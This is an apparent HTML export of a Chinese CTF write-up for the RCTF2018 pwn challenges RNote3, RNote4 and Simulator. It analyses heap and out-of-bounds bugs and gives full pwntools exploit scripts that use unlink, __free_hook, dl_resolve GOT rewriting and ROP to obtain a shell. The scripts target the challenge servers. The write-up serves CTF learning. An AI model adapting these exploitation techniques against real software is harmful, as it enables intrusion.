@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Write_up</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<script type="text/javascript" src="directory.js"></script>
+</head>
+<body>
+<p>5/24/2018 11:25:55 PM </p>
+<h1>RCTF2018 PWN</h1>
+<h1>Rnote</h1>
+<h2>1.题目分析</h2>
+<p>典型的菜单题目，漏洞点位于delete_note()中，对ptr指针没有进行初始化。因此，该指针保存了之前函数对该栈地址（ebp-x018）赋值过后的值。<br />
+存在漏洞函数如下所示：<br />
+<img src="https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/1.PNG" alt="漏洞点" /><br />
+保护机制如下：<br />
+<img src="https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/2.PNG" alt="保护机制" />  </p>
+<h2>2.漏洞利用</h2>
+<p>创建堆块如下所示：</p>
+<pre><code>payload = 'AAAAAA'
+ru('Exit\n')
+add_note('a',0x28,payload)
+add_note('d',0x28,payload)
+add_note('b',0x88,payload)
+add_note('c',0x88,payload)
+add_note('f',0x88,payload)
+</code></pre>
+
+<h3>2.1 泄露libc地址</h3>
+<p>首先通过show_note()函数对之后想要释放的堆块进行定位，然后调用delete_note()函数，传入一个当前不存在的title值，此时程序遍历当前note列表，无法找到对应title的note，因此就不会对ptr指针进行更新，默认释放了之前show_note()函数对该栈地址设定的值。并且对note_list进行清空时，i=32，note_list[32]=0。 </p>
+<pre><code>step 1: leak libc
+show_note('c')
+rl()
+delete_note('ccc')
+show_note('\x00')
+ru('content: ')
+top_addr = u64(rv(6).ljust(8,'\x00'))
+lg('top_addr',top_addr)
+libc.address = top_addr - 0x58 - 0x3C4B20
+lg('libc_addr',libc.address)
+</code></pre>
+
+<p>一个需要注意的点是，保存note结构的chunk是一个fastbin，当对该fastbin进行free后，如果该fastbin是对应fastbin链表中第一个被释放的，fd位置会被清0，而fd的位置正好保存了title值。因此查找时不应该查找原title值，应该查找'\x00'。</p>
+<h3>2.2 泄露堆地址</h3>
+<p>方法与lead libc相同，不同的在于，需要释放一个conten也为fastbin大小（0x30）的note。然后申请一个content大小为smallbin大小的note，将刚才释放的note结构（0x20）申请回来。再次释放一个content大小为fastbin大小（0x30）的note，此时0x30大小的fastbin空闲链表中就有2个chunk，其中第一个chunk的fd字段就为一个heap地址，并且0x20大小的fastbin空闲链表中只有一个chunk（note结构），其fd字段为0。</p>
+<pre><code>step 2: leak heap_addr
+add_note('c',0x88,payload)
+
+show_note('a')
+rl()
+delete_note('ccc')
+add_note('e',0x88,payload)
+show_note('d')
+rl()
+delete_note('ccc')
+show_note('\x00')
+ru('content: ')
+heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
+lg('heap_addr',heap_addr)
+</code></pre>
+
+<h3>2.3 触发unlink，修改free_hook为system</h3>
+<p>通过堆布局，使两个smallbin（content）在堆空间布局上连续。然后释放相邻的两个smallbin，并再次申请一个content大小为0x90（大于0x88即可）的note结构。覆写下一个chunk的presize和size字段，然后释放下一个chunk，出发unlink。<br />
+之后覆写free_hook为system，成功实现利用。  </p>
+<h3>3.expolit代码</h3>
+<pre><code>from pwn import *
+from ctypes import *
+import os
+#import roputils as rop
+
+remote_addr = &quot;rnote3.2018.teamrois.cn&quot;
+remote_port = 7322
+
+local_addr = &quot;127.0.0.1&quot;
+local_port = 1807
+
+pc = &quot;./RNote3&quot;
+pwn_elf = ELF(pc)
+pwn_rop = rop.ROP(pc)
+
+uselibc = 2 #0 for no,1 for i386,2 for x64
+local = 0
+haslibc = 1
+atta = 0
+
+if uselibc == 2:
+    context.arch = &quot;amd64&quot;
+else:
+    context.arch = &quot;i386&quot;
+
+if uselibc ==2 and haslibc == 0:
+    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+else:
+    if uselibc == 1 and haslibc == 0:
+        libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
+    else:
+        libc = ELF('./libc.so.6')
+
+if local == 1:
+    if haslibc:
+        p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
+    else:
+        p = process(pc)
+elif local == 0:
+    p = remote(remote_addr,remote_port)
+    if haslibc:
+        libc = ELF('./libc.so.6')
+else:
+    p = remote(local_addr,local_port)
+    if haslibc:
+        libc = ELF('./libc.so.6')
+
+context.log_level = True
+
+if local:
+    if atta:
+        gdb.attach(p,'b *0x555555554000+0x0000000000001109')
+        #b *0x0804887F \n 
+        #0x400b6a
+
+def ru(a):
+    return p.recvuntil(a)
+
+def sn(a):
+    p.send(a)
+
+def rl():
+    return p.recvline()
+
+def sl(a):
+    p.sendline(a)
+
+def rv(a):
+    return p.recv(a)
+
+def raddr(a,l=None):
+    if l == None:
+        return u64(rv(a).ljust(8,'\x00'))
+    else:
+        return u64(rl().strip('\n').ljust(8,'\x00'))
+
+def lg(s,addr):
+    print('\033[1;31;40m%20s--&gt;0x%x\033[0m'%(s,addr))
+
+def sa(a,b):
+    p.sendafter(a,b)
+
+def sla(a,b):
+    p.sendlineafter(a,b)
+
+def add_note(title,size,content):
+    sl('1')
+    sla('title: ',title)
+    sla('size: ',str(size))
+    sla('content: ',content)
+
+def show_note(title):
+    sl('2')
+    sla('title: ',title)
+
+
+def edit_note(title,content):
+    sl('3')
+    sla('title: ',title)
+    sla('content: ',content)
+
+def delete_note(title):
+    sl('4')
+    sla('title: ',title)
+
+def hack():
+    raw_input()
+    payload = 'AAAAAA'
+    ru('Exit\n')
+    add_note('a',0x28,payload)
+    add_note('d',0x28,payload)
+    add_note('b',0x88,payload)
+    add_note('c',0x88,payload)
+    add_note('f',0x88,payload)
+
+    # step 1: leak libc
+    show_note('c')
+    rl()
+    delete_note('ccc')
+    show_note('\x00')
+    ru('content: ')
+    top_addr = u64(rv(6).ljust(8,'\x00'))
+    lg('top_addr',top_addr)
+    libc.address = top_addr - 0x58 - 0x3C4B20
+    lg('libc_addr',libc.address)
+
+    # step 2: leak heap_addr
+    add_note('c',0x88,payload)
+
+    show_note('a')
+    rl()
+    delete_note('ccc')
+    add_note('e',0x88,payload)
+    show_note('d')
+    rl()
+    delete_note('ccc')
+    show_note('\x00')
+    ru('content: ')
+    heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
+    lg('heap_addr',heap_addr)
+
+    # step 3: unlink overwrite free_hook
+    add_note('h',0x18,'AAAAA')
+    show_note('e')
+    rl()
+    delete_note('ccc')
+    delete_note('f')
+    delete_note('b')
+    fake_fd = heap_addr + 0xc0 - 0x18
+    fake_bk = heap_addr + 0xc0 - 0x10
+    payload = p64(0) + p64(0x81) + p64(fake_fd) + p64(fake_bk)
+    payload = payload.ljust(0x80,'A')
+    payload += p64(0x80) + p64(0x90) + p64(0) + p64(0)
+    add_note('g',0x90,payload)
+    add_note('i',0x70,'AAAAA')
+    delete_note('c')
+
+    show_note('\x00')
+    rl()
+    delete_note('ccc')
+
+    free_hook = libc.symbols['__free_hook']
+    lg('free_hook',free_hook)
+    payload = p64(0x21) + p64(0x67) + p64(0x90) + p64(free_hook)
+    edit_note('g',payload)
+    #one_gadget = libc.address + 0xf02a4
+    system_addr = libc.symbols['system']
+    payload = p64(system_addr)
+    edit_note('g',payload)
+
+    add_note('aaa',0x18,'/bin/sh\0')
+    delete_note('aaa')
+    p.interactive()
+
+hack()
+</code></pre>
+
+<h1>Rnote4</h1>
+<h2>1.题目分析</h2>
+<p>在edit_note()函数中存在简单粗暴的堆溢出漏洞，关键在于如何利用，程序无任何能泄露地址的地方。<br />
+存在漏洞点如下图所示:<br />
+<img src="https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/RNote4/picture/1.PNG" alt="漏洞点" /><br />
+保护机制中，No PIE，No RELRO。</p>
+<h2>2.漏洞利用</h2>
+<p>可以发现程序没有开启基地址随机化，并且可覆写GOT表。因此考虑采用dl<em>resolve改写free</em>got为system地址，然后调用free函数，实现利用。</p>
+<h3>2.1 改写ELF文件头的dynamic节的strtab字段</h3>
+<p>改写strtab字段值为一个可控的内存区域。</p>
+<h3>2.2 伪造strtab</h3>
+<p>改写strtab中&quot;free&quot;字符串偏移处为&quot;system&quot;。</p>
+<h3>2.3 改写free_got</h3>
+<p>改写free_got为free_plt+0x6，使其执行dl_resolve。</p>
+<h2>3.expolit代码</h2>
+<pre><code>from pwn import *
+from ctypes import *
+import os
+#import roputils as rop
+
+remote_addr = &quot;rnote4.2018.teamrois.cn&quot;
+remote_port = 6767
+local_addr = &quot;127.0.0.1&quot;
+local_port = 1807
+
+pc = &quot;./RNote4&quot;
+pwn_elf = ELF(pc)
+
+uselibc = 2 #0 for no,1 for i386,2 for x64
+local = 0
+haslibc = 0
+atta = 0
+
+if uselibc == 2:
+    context.arch = &quot;amd64&quot;
+else:
+    context.arch = &quot;i386&quot;
+
+if uselibc ==2 and haslibc == 0:
+    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+else:
+    if uselibc == 1 and haslibc == 0:
+        libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
+    else:
+        libc = ELF('./libc.so.6')
+
+if local == 1:
+    if haslibc:
+        p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
+    else:
+        p = process(pc)
+elif local == 0:
+    p = remote(remote_addr,remote_port)
+    if haslibc:
+        libc = ELF('./libc.so.6')
+else:
+    p = remote(local_addr,local_port)
+    if haslibc:
+        libc = ELF('./libc.so.6')
+
+context.log_level = True
+
+if local:
+    if atta:
+        gdb.attach(p,'b *0x0000000000400A85')
+        #b *0x0804887F \n 
+        #0x400b6a
+
+def ru(a):
+    return p.recvuntil(a)
+
+def sn(a):
+    p.send(a)
+
+def rl():
+    return p.recvline()
+
+def sl(a):
+    p.sendline(a)
+
+def rv(a):
+    return p.recv(a)
+
+def raddr(a,l=None):
+    if l == None:
+        return u64(rv(a).ljust(8,'\x00'))
+    else:
+        return u64(rl().strip('\n').ljust(8,'\x00'))
+
+def lg(s,addr):
+    print('\033[1;31;40m%20s--&gt;0x%x\033[0m'%(s,addr))
+
+def sa(a,b):
+    p.sendafter(a,b)
+
+def sla(a,b):
+    p.sendlineafter(a,b)
+
+def add_note(size,content):
+    sn('\x01')
+    sn(chr(size))
+    sn(content)
+
+def edit_note(index,size,content):
+    sn('\x02')
+    sn(chr(index))
+    sn(chr(size))
+    sn(content)
+
+def delete_note(index):
+    sn('\x03')
+    sn(chr(index))
+
+def hack():
+    raw_input()
+    dynamic_strtab = 0x0000000000601EA8
+    strtab = 0x00000000004003F8
+    str_free = 0x0000000000400457
+    str_free_offset = str_free - strtab
+
+    free_got = pwn_elf.got['free']
+    free_plt = 0x0000000000400620
+
+    lg('free_plt',free_plt)
+    lg('free_got',free_got)
+
+    add_note(0x10,'A'*0x10)
+    add_note(0x10,'A'*0x10)
+    add_note(0x30,'A'*0x30)
+
+    payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(dynamic_strtab)
+    edit_note(1,0x30,payload)
+
+    data = 0x601400
+    payload = p64(5) + p64(data)
+    edit_note(2,0x10,payload)
+
+    payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(data)
+    edit_note(1,0x30,payload)
+
+    payload = '\x00'*str_free_offset + 'system\x00'
+    edit_note(2,str_free_offset+7,payload)
+
+    payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(free_got)
+    edit_note(1,0x30,payload)
+
+    payload = p64(free_plt+0x6)
+    edit_note(2,8,payload)
+
+    payload = '/bin/sh\0'
+    edit_note(1,8,payload)
+    delete_note(1)
+    p.interactive()
+
+hack()
+</code></pre>
+
+<h1>Simulator</h1>
+<h2>1.题目分析</h2>
+<p>MIPS模拟器，支持12条MIPS基本指令，提供了32个整数寄存器，以及0x1000大小的.data段和0x1000大小的.text段。其中寄存器及指令相关信息如下所示。</p>
+<h3>Descripion of register：</h3>
+<p><strong>zeor</strong><br />
+<strong>at</strong><br />
+<strong>v0~v1</strong><br />
+<strong>a0~a3</strong><br />
+<strong>t0~t7</strong><br />
+<strong>s0~s7</strong><br />
+<strong>t8~t9</strong><br />
+<strong>k0~k1</strong><br />
+<strong>gp</strong><br />
+<strong>sp</strong><br />
+<strong>fp</strong><br />
+<strong>ra</strong><br />
+共32个寄存器。</p>
+<h3>Descripion of instruction：</h3>
+<h4>1.li</h4>
+<p>load immeadiate<br />
+<strong>opcode:0x21</strong><br />
+operand 1: register<br />
+operand 2: immediate  </p>
+<h4>2.lw</h4>
+<p>load word<br />
+<strong>opcode:0x23</strong><br />
+operand 1: register<br />
+operand 2: register/memory_label  </p>
+<h4>3.sw</h4>
+<p>store word<br />
+<strong>opcode:0x2B</strong><br />
+operand 1: register<br />
+operand 2: register  </p>
+<h4>4.move</h4>
+<p><strong>opcode:0x06</strong><br />
+operand 1: register<br />
+operand 2: register  </p>
+<h4>5.beq ####</h4>
+<p><strong>opcode:0x04</strong><br />
+operand 1: register<br />
+operand 2: register<br />
+operand 3: offset  </p>
+<h4>6.j(jmp)</h4>
+<p>jmp <br />
+<strong>opcode:0x02</strong><br />
+operand 1: offset  </p>
+<h4>7.Arithmetic instructions ####</h4>
+<p><strong>opcode:0x20  ins_func:add<br />
+opcode:0x22  ins_func:sub<br />
+opcode:0x24  ins_func:and<br />
+opcode:0x25  ins_func:or<br />
+opcode:0x2a  ins_func:slt</strong><br />
+operand 1: register/imm<br />
+operand 2: register/imm<br />
+operand 3: register/imm  </p>
+<h4>8.syscall</h4>
+<p><strong>opcode:0x0c</strong><br />
+function: if(v0==1) printf value of a0。  </p>
+<h3>程序漏洞点:</h3>
+<p>1.add，sub函数存在数组下标越界，其中参数a1既可以是一个寄存器也可以是一个立即数。如果是一个立即数，则其大小只要在int范围内均可。<br />
+<img src="https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/1.PNG" alt="漏洞点1" /><br />
+2.lw，sw函数存在数组下标越界，由于程序中比较的方法为有符号数的比较（jle），因此可以采用负数来进行绕过。<br />
+<img src="https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/3.PNG" alt="漏洞点2" /><br />
+3.栈溢出漏洞，可结合前两个漏洞。修改__stack_chk_fail的got表为ret地址，然后进行rop（可采用<strong>dl_resolve</strong>和<strong>DynEym</strong>两种方法）。<br />
+<img src="https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/4.PNG" alt="漏洞点3" /></p>
+<h2>2.漏洞利用</h2>
+<h3>2.1 覆写stack_chk_fail的GOT表为RET地址</h3>
+<h4>Method 1:</h4>
+<p>使用sub或and指令</p>
+<pre><code># Method 1： use add/sub
+change_2_text()
+offset = ((stack_chk_fail_got - register_val) &amp; 0xffffffff )/8-0x20
+print hex(offset) 
+code = 'add '+str(offset)+','+str(leave_ret)+','+str(0)
+input_code(code)
+</code></pre>
+
+<h4>Method 2:</h4>
+<p>使用lw和sw指令，在这主要是用sw指令进行覆写。使用lw指令进行信息泄露的原理与其类似。</p>
+<pre><code># Method 2: use lw/sw
+change_2_text()
+code = 'li $t0,' + str(leave_ret)
+input_code(code)
+offset = (stack_chk_fail_got - mapp0 - 4)/8 + 0xE0000000
+print hex(offset)
+code = 'li $t1,' + str(offset)
+input_code(code)
+code = 'sw $t0,$t1'
+input_code(code)
+sl('END')
+</code></pre>
+
+<p>一个需要注意的点就是在计算offset时，由于必须保证<code>t1&lt;=0x400</code>，且mapp0的值是小于stack_chk_fail_got的。
+因此必须是t1的值必须为一个复制，且满足等式要求使其高位被舍去。</p>
+<h3>2.2 栈溢出利用</h3>
+<h4>Method 1: dl_2_resolve</h4>
+<p>直接使用roputils进行dl_resolve的构造，唯一需要注意的点就是程序中没有read函数，可使用fgets函数进行代替。但fgets函数的第三个参数为stdin，需要先进行leak。</p>
+<pre><code># step 2: leak the value of stdin
+offset = 0x30
+payload = pwn_rop.retfill(offset)
+payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
+payload += p32(vul_func)
+sla('comment: ',payload)
+stdin_addr = u32(rv(4))
+lg('stdin_addr',stdin_addr)
+
+# step 3: dl_resolve
+sl('END')
+payload = pwn_rop.retfill(offset)
+payload += pwn_rop.call(fgets_plt, addr_bss, 100, stdin_addr)
+payload += pwn_rop.dl_resolve_call(addr_bss + 20, addr_bss)
+sla('comment: ',payload)
+
+payload = pwn_rop.string('/bin/sh')
+payload += pwn_rop.fill(20, payload)
+payload += pwn_rop.dl_resolve_data(addr_bss + 20, 'system')
+payload += pwn_rop.fill(100, payload)
+sl(payload)
+</code></pre>
+
+<h4>Method 2: DynELF</h4>
+<p>puts函数构造leak，未完待续。。。</p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
